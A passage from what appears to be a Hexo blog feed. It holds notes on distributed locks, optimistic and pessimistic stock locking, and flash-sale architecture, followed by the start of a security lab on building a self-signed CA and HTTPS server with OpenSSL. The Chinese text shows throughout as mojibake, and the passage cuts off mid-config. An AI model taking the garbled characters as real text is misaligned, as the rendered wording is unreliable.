<li>å¦‚æœå–åˆ°äº†é”ï¼Œkeyçš„çœŸæ­£æœ‰æ•ˆæ—¶é—´ç­‰äºæœ‰æ•ˆæ—¶é—´å‡å»è·å–é”æ‰€ä½¿ç”¨çš„æ—¶é—´ï¼ˆæ­¥éª¤3è®¡ç®—çš„ç»“æœï¼‰ã€‚</li>
<li>å¦‚æœå› ä¸ºæŸäº›åŸå› ï¼Œè·å–é”å¤±è´¥ï¼ˆ<em>æ²¡æœ‰</em>åœ¨è‡³å°‘N&#x2F;2+1ä¸ªRediså®ä¾‹å–åˆ°é”æˆ–è€…å–é”æ—¶é—´å·²ç»è¶…è¿‡äº†æœ‰æ•ˆæ—¶é—´ï¼‰ï¼Œå®¢æˆ·ç«¯åº”è¯¥åœ¨æ‰€æœ‰çš„Rediså®ä¾‹ä¸Šè¿›è¡Œè§£é”ï¼ˆå³ä¾¿æŸäº›Rediså®ä¾‹æ ¹æœ¬å°±æ²¡æœ‰åŠ é”æˆåŠŸï¼‰ã€‚</li>
</ol>
</blockquote>
<h1 id="5-ç§’æ€ç›¸å…³"><a href="#5-ç§’æ€ç›¸å…³" class="headerlink" title="5.ç§’æ€ç›¸å…³"></a>5.ç§’æ€ç›¸å…³</h1><h2 id="5-1-é”ï¼Œå‡åº“å­˜"><a href="#5-1-é”ï¼Œå‡åº“å­˜" class="headerlink" title="5.1.é”ï¼Œå‡åº“å­˜"></a>5.1.é”ï¼Œå‡åº“å­˜</h2><h3 id="1ï¼‰æ‚²è§‚é”"><a href="#1ï¼‰æ‚²è§‚é”" class="headerlink" title="1ï¼‰æ‚²è§‚é”"></a>1ï¼‰æ‚²è§‚é”</h3><p>æ€»æ˜¯å‡è®¾æœ€åçš„æƒ…å†µï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¼šä¿®æ”¹ï¼Œæ‰€ä»¥æ¯æ¬¡åœ¨æ‹¿æ•°æ®çš„æ—¶å€™éƒ½ä¼šä¸Šé”ï¼Œè¿™æ ·åˆ«äººæƒ³æ‹¿è¿™ä¸ªæ•°æ®å°±ä¼šé˜»å¡ç›´åˆ°å®ƒæ‹¿åˆ°é”ï¼ˆå…±äº«èµ„æºæ¯æ¬¡åªç»™ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œå…¶å®ƒçº¿ç¨‹é˜»å¡ï¼Œç”¨å®Œåå†æŠŠèµ„æºè½¬è®©ç»™å…¶å®ƒçº¿ç¨‹ï¼‰ã€‚ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“é‡Œè¾¹å°±ç”¨åˆ°äº†å¾ˆå¤šè¿™ç§é”æœºåˆ¶ï¼Œæ¯”å¦‚è¡Œé”ï¼Œè¡¨é”ç­‰ï¼Œè¯»é”ï¼Œå†™é”ç­‰ï¼Œéƒ½æ˜¯åœ¨åšæ“ä½œä¹‹å‰å…ˆä¸Šé”ã€‚Javaä¸­synchronizedå’ŒReentrantLockç­‰ç‹¬å é”å°±æ˜¯æ‚²è§‚é”æ€æƒ³çš„å®ç°ã€‚</p>
<p>ä»¥å‡åº“å­˜ä¸ºä¾‹æ¥è¯´ï¼š</p>
<p>å‡åº“å­˜å…ˆè¦æŸ¥è¯¢åº“å­˜ï¼Œåˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³ï¼Œç„¶åå†å‡åº“å­˜ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æŸ¥è¯¢åº“å­˜åï¼Œåˆ¤æ–­åº“å­˜æ˜¯å……è¶³çš„ï¼Œæ­¤æ—¶æœ‰äººä¿®æ”¹äº†åº“å­˜ï¼Œåˆ™æˆ‘ä»¬çš„åˆ¤æ–­å°±ä¸å‡†ç¡®äº†ï¼Œæ­¤æ—¶å†™æ•°æ®å°±ä¼šåˆåº“å­˜è¶…å–çš„é£é™©ã€‚</p>
<p>å¿…é¡»ä¿è¯ä»æŸ¥è¯¢å¼€å§‹å°±é”å®šæ•°æ®ï¼Œä¿è¯å…¶å®ƒäººæ— æ³•æ“ä½œï¼Œå¯ä»¥é€šè¿‡ä¸‹åˆ—æ–¹å¼å®ç°ï¼š</p>
<ul>
<li><p>åŒæ­¥æ–¹æ³•æˆ–Synchronizedï¼šé€‚ç”¨äºå•ç‚¹é¡¹ç›®ï¼Œåˆ†å¸ƒå¼ä¸‹ä¼šå¤±æ•ˆã€‚</p>
</li>
<li><p>åˆ†å¸ƒå¼é”ï¼šæŠŠæ•´ä¸ªå‡åº“å­˜æ–¹æ³•é€šè¿‡åˆ†å¸ƒå¼é”é”å®šï¼Œä¸å…è®¸ä»–äººæ‰§è¡Œå‡åº“å­˜é€»è¾‘</p>
</li>
<li><p>æ•°æ®åº“é”ï¼šåœ¨æ‰§è¡ŒæŸ¥è¯¢è¯­å¥æ—¶ï¼Œåœ¨è¯­å¥åé¢è·Ÿä¸Š for updateï¼Œåˆ™æŸ¥è¯¢å³ä¼šå¯¹æ•°æ®åŠ é”ï¼Œå…¶å®ƒäººå°±æ— æ³•æ“ä½œäº†ã€‚</p>
</li>
</ul>
<h3 id="2ï¼‰ä¹è§‚é”"><a href="#2ï¼‰ä¹è§‚é”" class="headerlink" title="2ï¼‰ä¹è§‚é”"></a>2ï¼‰ä¹è§‚é”</h3><p>æ€»æ˜¯å‡è®¾æœ€å¥½çš„æƒ…å†µï¼Œæ¯æ¬¡å»æ‹¿æ•°æ®çš„æ—¶å€™éƒ½è®¤ä¸ºåˆ«äººä¸ä¼šä¿®æ”¹ï¼Œæ‰€ä»¥ä¸ä¼šä¸Šé”ï¼Œä½†æ˜¯åœ¨æ›´æ–°çš„æ—¶å€™ä¼šåˆ¤æ–­ä¸€ä¸‹åœ¨æ­¤æœŸé—´åˆ«äººæœ‰æ²¡æœ‰å»æ›´æ–°è¿™ä¸ªæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ç‰ˆæœ¬å·æœºåˆ¶å’ŒCASç®—æ³•å®ç°ã€‚ä¹è§‚é”é€‚ç”¨äºå¤šè¯»çš„åº”ç”¨ç±»å‹ï¼Œè¿™æ ·å¯ä»¥æé«˜ååé‡ï¼Œåƒæ•°æ®åº“æä¾›çš„ç±»ä¼¼äºwrite_conditionæœºåˆ¶ï¼Œå…¶å®éƒ½æ˜¯æä¾›çš„ä¹è§‚é”ã€‚åœ¨Javaä¸­java.util.concurrent.atomicåŒ…ä¸‹é¢çš„AtomicIntegerå°±æ˜¯ä½¿ç”¨äº†ä¹è§‚é”çš„ä¸€ç§å®ç°æ–¹å¼CASå®ç°çš„ã€‚</p>
<p>ä»¥å‡åº“å­˜ä¸ºä¾‹æ¥è¯´ï¼š</p>
<p>å‡åº“å­˜å…ˆè¦æŸ¥è¯¢åº“å­˜ï¼Œåˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³ï¼Œç„¶åå†å‡åº“å­˜ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æŸ¥è¯¢åº“å­˜åï¼Œåˆ¤æ–­åº“å­˜æ˜¯å……è¶³çš„ï¼Œæ­¤æ—¶æœ‰äººä¿®æ”¹äº†åº“å­˜ï¼Œåˆ™æˆ‘ä»¬çš„åˆ¤æ–­å°±ä¸å‡†ç¡®äº†ï¼Œæ­¤æ—¶å†™æ•°æ®å°±ä¼šåˆåº“å­˜è¶…å–çš„é£é™©ã€‚</p>
<p>æˆ‘ä»¬å‡è®¾è‡ªå·±å‡åº“å­˜æ—¶æ²¡æœ‰å…¶å®ƒäººåœ¨æ“ä½œï¼Œä¸è¿‡æ‰§è¡Œsqlæ—¶å¯¹åº“å­˜æ£€æŸ¥å³å¯ã€‚</p>
<h4 id="æ–¹å¼1ï¼šç‰ˆæœ¬å·"><a href="#æ–¹å¼1ï¼šç‰ˆæœ¬å·" class="headerlink" title="æ–¹å¼1ï¼šç‰ˆæœ¬å·"></a>æ–¹å¼1ï¼šç‰ˆæœ¬å·</h4><p>åœ¨åº“å­˜è¡¨æ·»åŠ versionå­—æ®µï¼Œæ¯æ¬¡ä¿®æ”¹æ•°æ®éƒ½å¯¹versionæ‰§è¡Œ+1æ“åšã€‚</p>
<p>å‡åº“å­˜æ­¥éª¤ï¼š</p>
<ul>
<li>æŸ¥è¯¢versionå€¼ï¼Œä¾‹å¦‚æ­¤æ—¶versionæ˜¯20</li>
<li>æ‰§è¡Œå‡åº“å­˜ï¼Œåœ¨whereæ¡ä»¶ä¸­åˆ¤æ–­ versionå€¼æ˜¯å¦ç­‰äºæŸ¥è¯¢åˆ°çš„versionå€¼ï¼š<ul>
<li>UPDATE tb_stock SET stock &#x3D; stock - 1, version &#x3D; 21 WHERE id &#x3D; 101 AND version &#x3D; 20</li>
</ul>
</li>
</ul>
<h4 id="æ–¹å¼2ï¼šåˆ¤æ–­åº“å­˜"><a href="#æ–¹å¼2ï¼šåˆ¤æ–­åº“å­˜" class="headerlink" title="æ–¹å¼2ï¼šåˆ¤æ–­åº“å­˜"></a>æ–¹å¼2ï¼šåˆ¤æ–­åº“å­˜</h4><p>å› ä¸ºåº“å­˜æœ¬èº«å°±æ˜¯æ•°å€¼ï¼Œå¯ä»¥ç”¨åº“å­˜æ¥åšæ£€æŸ¥ï¼Œä»£æ›¿ç‰ˆæœ¬å·ï¼š</p>
<ul>
<li>æŸ¥è¯¢åº“å­˜ï¼Œä¾‹å¦‚å€¼æ˜¯20ï¼Œéœ€è¦å‡åº“å­˜å€¼ä¸º 2</li>
<li>å‡åº“å­˜ï¼šUPDATE tb_stock SET stock &#x3D; 18 WHERE id &#x3D; 101 AND stock &#x3D; 20</li>
</ul>
<p>è¿™ç§æ–¹å¼å¯èƒ½æœ‰å®‰å…¨æ¼æ´ï¼Œå³CASè¿™ABAé—®é¢˜ï¼Œæ¯”å¦‚æˆ‘æŸ¥è¯¢çš„æ—¶å€™æ˜¯20ï¼Œæœ‰äººè´­ä¹°äº†ä¸€ä¸ªå•†å“ï¼Œå˜æˆäº†19ï¼Œç„¶ååˆæœ‰äººé€€è´§ï¼Œåº“å­˜æ¢å¤ä¸º20ã€‚æˆ‘ä»¬è®¤ä¸ºåº“å­˜æ²¡å˜ï¼Œå…¶å®æ­¤æ—¶å·²ç»æœ‰äººä¿®æ”¹äº†æ•°æ®äº†ã€‚</p>
<h3 id="æ–¹å¼3ï¼šæ— ç¬¦å·æ•°"><a href="#æ–¹å¼3ï¼šæ— ç¬¦å·æ•°" class="headerlink" title="æ–¹å¼3ï¼šæ— ç¬¦å·æ•°"></a>æ–¹å¼3ï¼šæ— ç¬¦å·æ•°</h3><p>åº“å­˜æ˜¯æ•°å­—ï¼Œå¦‚æœæˆ‘ä»¬æŠŠåº“å­˜å˜æˆæ— ç¬¦å·æ•°å­—ï¼Œåˆ™æ•°æ®åº“é»˜è®¤ä¸èƒ½ä¸ºè´Ÿï¼Œå¦‚æœå‡åº“å­˜ä¼ å…¥çš„å€¼ä¸ºè´Ÿæ•°ï¼Œæ•°æ®åº“ç›´æ¥æŠ¥é”™ï¼Œå› æ­¤å‡åº“å­˜æ—¶æ— éœ€åšç‰¹æ®Šåˆ¤æ–­ï¼Œç›´æ¥å‡åº“å­˜å³å¯ã€‚</p>
<h3 id="3ï¼‰ä½¿ç”¨åœºæ™¯"><a href="#3ï¼‰ä½¿ç”¨åœºæ™¯" class="headerlink" title="3ï¼‰ä½¿ç”¨åœºæ™¯"></a>3ï¼‰ä½¿ç”¨åœºæ™¯</h3><p>ä¹è§‚é”é€‚ç”¨äºå†™æ¯”è¾ƒå°‘çš„æƒ…å†µä¸‹ï¼ˆå¤šè¯»åœºæ™¯ï¼‰ï¼Œå³å†²çªçœŸçš„å¾ˆå°‘å‘ç”Ÿçš„æ—¶å€™ï¼Œè¿™æ ·å¯ä»¥çœå»äº†é”çš„å¼€é”€ï¼ŒåŠ å¤§äº†ç³»ç»Ÿçš„æ•´ä¸ªååé‡ã€‚ä½†å¦‚æœæ˜¯å¤šå†™çš„æƒ…å†µï¼Œä¸€èˆ¬ä¼šç»å¸¸äº§ç”Ÿå†²çªï¼Œè¿™å°±ä¼šå¯¼è‡´ä¸Šå±‚åº”ç”¨ä¼šä¸æ–­çš„è¿›è¡Œretryï¼Œè¿™æ ·åå€’æ˜¯é™ä½äº†æ€§èƒ½ï¼Œæ‰€ä»¥ä¸€èˆ¬å¤šå†™çš„åœºæ™¯ä¸‹ç”¨æ‚²è§‚é”å°±æ¯”è¾ƒåˆé€‚ã€‚</p>
<h2 id="5-2-ç§’æ€æ€è·¯"><a href="#5-2-ç§’æ€æ€è·¯" class="headerlink" title="5.2.ç§’æ€æ€è·¯"></a>5.2.ç§’æ€æ€è·¯</h2><p>ç§’æ€é—®é¢˜çš„éš¾ç‚¹ï¼š</p>
<ul>
<li>é«˜å¹¶å‘ï¼ŒæœåŠ¡ç«¯tomcatå¹¶å‘èƒ½åŠ›æœ‰é™</li>
<li>å‡åº“å­˜å¤šçº¿ç¨‹æ‰§è¡Œå®¹æ˜“è¶…å–</li>
<li>ä¸‹å•ä¸šåŠ¡æµç¨‹ã€ä¸šåŠ¡é“¾è·¯è¾ƒé•¿ï¼Œè€—æ—¶è¾ƒä¹…ï¼ŒæœåŠ¡QPSä½</li>
<li>ç§’æ€é¡µé¢è¯·æ±‚é‡å¤§</li>
<li>ç§’æ€æœºå™¨äººé˜²èŒƒ</li>
</ul>
<p>å…·ä½“å®ç°ï¼š</p>
<h3 id="5-2-1-å‰ç«¯ä¼˜åŒ–"><a href="#5-2-1-å‰ç«¯ä¼˜åŒ–" class="headerlink" title="5.2.1.å‰ç«¯ä¼˜åŒ–"></a>5.2.1.å‰ç«¯ä¼˜åŒ–</h3><p>å‰ç«¯æ˜¯ç›´æ¥ä¸ç”¨æˆ·äº¤äº’çš„åœ°æ–¹ï¼Œå¹¶å‘æœ€é«˜ï¼Œä¸€èˆ¬æœ‰ä¸‹é¢æ‰‹æ®µå»å¤„ç†ï¼š</p>
<h4 id="1ï¼‰é¡µé¢é™æ€åŒ–"><a href="#1ï¼‰é¡µé¢é™æ€åŒ–" class="headerlink" title="1ï¼‰é¡µé¢é™æ€åŒ–"></a>1ï¼‰<strong>é¡µé¢é™æ€åŒ–</strong></h4><p>å°†ç§’æ€å•†å“é¡µé¢é™æ€åŒ–å¤„ç†ï¼Œå°‘é‡åŠ¨æ€æ•°æ®é€šè¿‡ajaxå¼‚æ­¥åŠ è½½ï¼Œè®¿é—®å•†å“é¡µé¢æ— éœ€å»æ•°æ®åº“æŸ¥è¯¢å•†å“ä¿¡æ¯ï¼Œå¤§å¤§æé«˜é¡µé¢åŠ è½½çš„é€Ÿåº¦ã€‚</p>
<h4 id="2ï¼‰CDNæœåŠ¡"><a href="#2ï¼‰CDNæœåŠ¡" class="headerlink" title="2ï¼‰CDNæœåŠ¡"></a>2ï¼‰<strong>CDNæœåŠ¡</strong></h4><p>é™æ€åŒ–å¯ä»¥è®©é¡µé¢å“åº”é€Ÿåº¦å¢åŠ ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„é™æ€èµ„æºæœåŠ¡å™¨å‹åŠ›è¿‡å¤§ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘è´­ä¹°CDNæœåŠ¡ï¼Œå°†é™æ€èµ„æºéƒ¨ç½²åˆ°CDNæœåŠ¡ï¼Œä¸€æ–¹é¢æé«˜å“åº”é€Ÿåº¦ï¼Œå¦ä¸€æ–¹é¢å‡è½»å¯¹æœåŠ¡ç«¯å‹åŠ›</p>
<h4 id="3ï¼‰ç§’æ€é™æµ"><a href="#3ï¼‰ç§’æ€é™æµ" class="headerlink" title="3ï¼‰ç§’æ€é™æµ"></a>3ï¼‰ç§’æ€é™æµ</h4><p>ç§’æ€æŒ‰é’®ç‚¹å‡»æ—¶ï¼Œä¸ç«‹å³å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼Œè€Œæ˜¯è¦æ±‚å›ç­”éªŒè¯é—®é¢˜ç­”æ¡ˆï¼Œå›ç­”ç»“æŸæ‰å‘é€ç§’æ€è¯·æ±‚ã€‚å¥½å¤„æœ‰2ç‚¹ï¼š</p>
<ul>
<li>ç”¨æˆ·å›ç­”é—®é¢˜è€—æ—¶ä¸åŒï¼ŒæŠŠç”¨æˆ·å‘é€è¯·æ±‚åˆ†æ•£åˆ°ä¸åŒäº‹ä»¶æ®µ</li>
<li>é™åˆ¶ç§’æ€æœºå™¨äººæˆ–çˆ¬è™«çš„æ¶æ„è®¿é—®</li>
</ul>
<h4 id="4ï¼‰åŠ¨æ€ç§’æ€æŒ‰é’®"><a href="#4ï¼‰åŠ¨æ€ç§’æ€æŒ‰é’®" class="headerlink" title="4ï¼‰åŠ¨æ€ç§’æ€æŒ‰é’®"></a>4ï¼‰åŠ¨æ€ç§’æ€æŒ‰é’®</h4><p>ä¸ºäº†é¿å…ç§’æ€å¼€å§‹å‰æœ‰äººæå‰è·å–ç§’æ€åœ°å€å¹¶ç¼–å†™ç§’æ€æœºå™¨äººï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç§’æ€æŒ‰é’®åˆ©ç”¨JSç»‘å®šï¼Œç§’æ€å¼€å§‹å‰å¯¹åº”çš„JSæ–‡ä»¶å†…å®¹è®¾ç½®ä¸ºç‚¹å‡»åç¦æ­¢å‘é€è¯·æ±‚ã€‚</p>
<p>ç§’æ€å¼€å§‹æ—¶ï¼Œæˆ‘ä»¬å†ä¿®æ”¹å¯¹åº”çš„JSæ–‡ä»¶å†…å®¹ï¼Œå¡«å†™çœŸå®å‘é€è¯·æ±‚åœ°å€ï¼Œè¿™æ ·å¼€å§‹å‰ä¸ä¼šæœ‰äººçŸ¥é“ç§’æ€çš„åœ°å€ä¿¡æ¯ã€‚</p>
<h4 id="5ï¼‰é¿å…é‡å¤è¿ç»­ç‚¹å‡»"><a href="#5ï¼‰é¿å…é‡å¤è¿ç»­ç‚¹å‡»" class="headerlink" title="5ï¼‰é¿å…é‡å¤è¿ç»­ç‚¹å‡»"></a>5ï¼‰é¿å…é‡å¤è¿ç»­ç‚¹å‡»</h4><p>ç‚¹å‡»ç§’æ€åï¼ŒæŒ‰é’®ç¦ç”¨ï¼Œä¸€å®šæ—¶é—´åå¼€å¯ä½¿ç”¨</p>
<h3 id="5-2-2-ç½‘å…³"><a href="#5-2-2-ç½‘å…³" class="headerlink" title="5.2.2.ç½‘å…³"></a>5.2.2.ç½‘å…³</h3><p>å¦‚æœé‡‡ç”¨Nginxä½œä¸ºç½‘å…³ï¼Œåˆ™å¯ä»¥å†Nginxä¸­å¯¹ç”¨æˆ·è¯·æ±‚é™æµï¼Œåªæ”¾è¡Œéƒ¨åˆ†ç”¨æˆ·è¯·æ±‚åˆ°è¾¾å¾®æœåŠ¡ç¾¤ã€‚</p>
<h3 id="5-2-3-å¾®æœåŠ¡"><a href="#5-2-3-å¾®æœåŠ¡" class="headerlink" title="5.2.3.å¾®æœåŠ¡"></a>5.2.3.å¾®æœåŠ¡</h3><h4 id="1ï¼‰é™æµ"><a href="#1ï¼‰é™æµ" class="headerlink" title="1ï¼‰é™æµ"></a>1ï¼‰é™æµ</h4><p>RateLimiteræ˜¯guavaæä¾›çš„åŸºäºä»¤ç‰Œæ¡¶ç®—æ³•çš„é™æµå®ç°ç±»ï¼Œé€šè¿‡è°ƒæ•´ç”Ÿæˆtokençš„é€Ÿç‡æ¥é™åˆ¶ç”¨æˆ·é¢‘ç¹è®¿é—®ç§’æ€é¡µé¢ï¼Œä»è€Œè¾¾åˆ°é˜²æ­¢è¶…å¤§æµé‡å†²å®ç³»ç»Ÿã€‚ï¼ˆä»¤ç‰Œæ¡¶ç®—æ³•çš„åŸç†æ˜¯ç³»ç»Ÿä¼šä»¥ä¸€ä¸ªæ’å®šçš„é€Ÿåº¦å¾€æ¡¶é‡Œæ”¾å…¥ä»¤ç‰Œï¼Œè€Œå¦‚æœè¯·æ±‚éœ€è¦è¢«å¤„ç†ï¼Œåˆ™éœ€è¦å…ˆä»æ¡¶é‡Œè·å–ä¸€ä¸ªä»¤ç‰Œï¼Œå½“æ¡¶é‡Œæ²¡æœ‰ä»¤ç‰Œå¯å–æ—¶ï¼Œåˆ™æ‹’ç»æœåŠ¡ã€‚</p>
<h4 id="2ï¼‰é¢„å‡åº“å­˜"><a href="#2ï¼‰é¢„å‡åº“å­˜" class="headerlink" title="2ï¼‰é¢„å‡åº“å­˜"></a>2ï¼‰é¢„å‡åº“å­˜</h4><p>è¯·æ±‚åˆ°è¾¾æœåŠ¡ç«¯ï¼Œå¹¶å‘ä¾ç„¶å¾ˆé«˜ï¼Œæ•°æ®åº“ç›´æ¥å¤„ç†è‚¯å®šéš¾ä»¥æ¥å—ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠç§’æ€çš„å•†å“åº“å­˜å­˜å…¥Redisï¼Œåˆ©ç”¨Redisä¸­çš„åº“å­˜åˆ¤æ–­ç§’æ€å•†å“æ˜¯å¦å……è¶³ï¼Œå†Redisä¸­å®ŒæˆæŠ¢è´­èµ„æ ¼åˆ¤æ–­ã€å‡åº“å­˜è¡Œä¸ºã€‚</p>
<p>ä½†æ˜¯ï¼Œå°½ç®¡rediså•çº¿ç¨‹è¿è¡Œï¼Œæ‰§è¡ŒRedisçš„Javaä»£ç ä¾ç„¶æœ‰çº¿ç¨‹å®‰å…¨é£é™©ï¼Œæ‰€ä»¥ä¸ºäº†ä¿è¯redisä¸­å‡åº“å­˜åˆ¤æ–­çš„å®‰å…¨æ€§ï¼Œè¿™é‡Œæ¨èä½¿ç”¨Luaè„šæœ¬ç¼–å†™ç›¸å…³é€»è¾‘ï¼Œä¿è¯ä»£ç æ‰§è¡Œçš„åŸå­æ€§ã€‚</p>
<h4 id="3ï¼‰æµé‡å‰Šå³°ï¼Œå¼‚æ­¥å†™æ•°æ®"><a href="#3ï¼‰æµé‡å‰Šå³°ï¼Œå¼‚æ­¥å†™æ•°æ®" class="headerlink" title="3ï¼‰æµé‡å‰Šå³°ï¼Œå¼‚æ­¥å†™æ•°æ®"></a>3ï¼‰æµé‡å‰Šå³°ï¼Œå¼‚æ­¥å†™æ•°æ®</h4><p>ç»è¿‡Redisçš„åˆ¤æ–­å¤„ç†ï¼Œå•ä¸ªå•†å“æ”¾è¡Œçš„è¯·æ±‚æ•°é‡åŸºæœ¬å°±æ˜¯åº“å­˜å‰©ä½™é‡ï¼Œè¯·æ±‚å¤§å¤§å‡å°‘ï¼Œä½†æ˜¯å¦‚æœå‚ä¸ç§’æ€å•†å“è¾ƒå¤šï¼Œç”¨æˆ·å¹¶å‘ä¾ç„¶å¾ˆé«˜ï¼Œæ•°æ®åº“å¯èƒ½ä¾ç„¶éš¾ä»¥å¤„ç†ï¼Œæ‰€ä»¥è¿˜éœ€è¦æŠŠä¸‹çš„ä¸šåŠ¡å¼‚æ­¥æ‰§è¡Œï¼Œå®ç°æµé‡å‰Šå³°ã€‚</p>
<p>ç”¨æˆ·åœ¨redisä¸­è·å–ä¸‹å•èµ„æ ¼åï¼Œä¸è¦å»æ‰§è¡Œä¸‹å•é€»è¾‘ï¼Œè€Œæ˜¯æŠŠç”¨æˆ·åŠèµ„æ ¼ä¿¡æ¯å‘é€åˆ°MQä¸­ï¼Œç„¶åå°±è¿”å›ç”¨æˆ·æŠ¢è´­æˆåŠŸçš„ç»“æœã€‚</p>
<p>æ­¤æ—¶æœåŠ¡ç«¯ä¸‹å•çš„ä¸šåŠ¡ç›‘å¬RabbitMQï¼Œé€ä¸ªå¤„ç†MQä¸­çš„ä¸‹å•æ¶ˆæ¯ï¼Œåˆ©ç”¨MQæ¥ç¼“å­˜é«˜å¹¶å‘çš„æµé‡ã€‚å˜åŒæ­¥å†™æ•°æ®ä¸ºå¼‚æ­¥å†™æ•°æ®ï¼Œå¤§å¤§ç¼©çŸ­ä¸šåŠ¡é“¾è·¯ï¼Œæé«˜å¹¶å‘ã€‚</p>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142559.png" alt="1574835214511"> </p>
<p>ç›‘å¬åˆ°MQåçš„å¤„ç†é€»è¾‘ï¼Œå…³é”®æ—¶å¦‚ä½•é˜²æ­¢åº“å­˜è¶…å–ï¼Œè¿™ä¸€ç‚¹æˆ‘ä»¬åœ¨ä¸Šé¢çš„5.1ä¸­å·²ç»è®²è¿‡ï¼Œä¸å†èµ˜è¿°ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142560.png" alt="1574835276351"> </p>
<p>ç§’æ€é¡¹ç›®ç›¸å…³èµ„æ–™ï¼š<a href="https://github.com/qiurunze123/miaosha">https://github.com/qiurunze123/miaosha</a></p>
<h1 id="6-åˆ†å¸ƒå¼äº‹åŠ¡"><a href="#6-åˆ†å¸ƒå¼äº‹åŠ¡" class="headerlink" title="6.åˆ†å¸ƒå¼äº‹åŠ¡"></a>6.åˆ†å¸ƒå¼äº‹åŠ¡</h1><p>è¯¦è§å¦ä¸€ä»½æ–‡æ¡£ï¼šåˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ</p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¿¡æ¯å®‰å…¨å®è·µLab1-è‡ªå»ºCAè¯ä¹¦æ­å»ºhttpsæœåŠ¡å™¨</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5Lab1-%E8%87%AA%E5%BB%BACA%E8%AF%81%E4%B9%A6%E6%90%AD%E5%BB%BAhttps%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h1 id="ä¿¡æ¯å®‰å…¨å®è·µLab1-è‡ªå»ºCAè¯ä¹¦æ­å»ºhttpsæœåŠ¡å™¨"><a href="#ä¿¡æ¯å®‰å…¨å®è·µLab1-è‡ªå»ºCAè¯ä¹¦æ­å»ºhttpsæœåŠ¡å™¨" class="headerlink" title="ä¿¡æ¯å®‰å…¨å®è·µLab1-è‡ªå»ºCAè¯ä¹¦æ­å»ºhttpsæœåŠ¡å™¨"></a>ä¿¡æ¯å®‰å…¨å®è·µLab1-è‡ªå»ºCAè¯ä¹¦æ­å»ºhttpsæœåŠ¡å™¨</h1><h2 id="æ­å»ºhttpsæœåŠ¡å™¨"><a href="#æ­å»ºhttpsæœåŠ¡å™¨" class="headerlink" title="æ­å»ºhttpsæœåŠ¡å™¨"></a>æ­å»ºhttpsæœåŠ¡å™¨</h2><p>æœ¬æœºç¯å¢ƒï¼š Ubuntu 20.04  OpenSSL 1.1.1f Firefox Browser 79.0(64-bit)</p>
<h3 id="å®‰è£…OpenSSL"><a href="#å®‰è£…OpenSSL" class="headerlink" title="å®‰è£…OpenSSL"></a>å®‰è£…OpenSSL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="language-bash">sudo apt-get install openssl</span></span><br></pre></td></tr></table></figure>

<h3 id="è‡ªå»ºCA"><a href="#è‡ªå»ºCA" class="headerlink" title="è‡ªå»ºCA"></a>è‡ªå»ºCA</h3><p>å»ºç«‹myCAç›®å½•ç”¨äºå­˜æ”¾CAç›¸å…³ä¿¡æ¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd &amp;&amp; mkdir -p myCA/signedcerts &amp;&amp; mkdir myCA/private &amp;&amp; cd myCA</span><br></pre></td></tr></table></figure>

<p>myCA ç”¨äºå­˜æ”¾ CA æ ¹è¯ä¹¦ï¼Œè¯ä¹¦æ•°æ®åº“ï¼Œä»¥åŠåç»­æœåŠ¡å™¨ç”Ÿæˆçš„è¯ä¹¦ï¼Œå¯†é’¥ä»¥åŠè¯·æ±‚<br>signedcerts:ä¿å­˜ç­¾åè¯ä¹¦çš„ copy<br>private: åŒ…å«ç§é’¥</p>
<p>é…ç½®myCAç›¸å…³å‚æ•°ï¼Œåœ¨myCAç›®å½•ä¸‹è¿›è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;01&#x27;&gt;serial &amp;&amp; touch index.txt</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºcaconfig.cnfæ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install vim</span><br><span class="line">vim ~/myCA/caconfig.cnf</span><br></pre></td></tr></table></figure>

<p>caconfig.cnfæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<p>æ³¨æ„æ–‡ä»¶ä¸­ä¸¤ä¸ªåœ°æ–¹çš„usernameéœ€è¦æ¢æˆä½ è‡ªå·±çš„ç”¨æˆ·åã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">My sample caconfig.cnf file.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Default configuration to use when one is not provided on the command line.</span></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[ ca ]</span></span><br><span class="line">default_ca      = local_ca</span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Default location of directories and files needed to generate certificates.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span 